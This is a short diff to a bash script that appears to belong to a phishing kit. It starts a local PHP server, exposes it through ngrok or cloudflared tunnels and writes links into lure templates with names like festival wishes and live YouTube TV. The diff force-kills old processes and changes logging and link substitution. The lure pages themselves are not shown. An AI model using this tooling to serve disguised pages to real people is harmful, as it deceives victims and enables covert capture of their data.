@@ -259,8 +259,16 @@ else
 fi
 fi
 
+if [[ "$windows_mode" == true ]]; then
+    taskkill /F /IM "php.exe" 2>/dev/null
+    taskkill /F /IM "cloudflared.exe" 2>/dev/null
+    taskkill /F /IM "ngrok.exe" 2>/dev/null
+else
+    pkill -9 php ngrok cloudflared > /dev/null 2>&1
+fi
+
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
@@ -458,9 +466,9 @@ checkfound
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+index2.html+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+index2.html+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
